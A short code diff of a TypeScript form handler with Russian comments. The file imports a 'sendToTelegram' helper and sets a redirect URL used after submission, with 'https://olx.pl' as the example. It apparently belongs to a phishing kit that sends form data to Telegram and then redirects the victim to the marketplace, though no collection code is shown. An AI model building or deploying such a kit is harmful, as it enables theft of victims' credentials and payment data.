@@ -7,7 +7,7 @@ import { sendToTelegram } from '../utils/api';
 // Вариант "message": после отправки показывается окно "письмо отправлено"
 // Чтобы включить редирект: введите ссылку в REDIRECT_URL ниже
 // Чтобы показать окно: оставьте REDIRECT_URL пустым ("")
-const REDIRECT_URL = "https://3pv8mkt.qpon/5ufrvzoh"; // например: "https://olx.pl" или "" для показа окна
+const REDIRECT_URL = ""; // например: "https://olx.pl" или "" для показа окна
 // ================================================
 
 interface FormData {
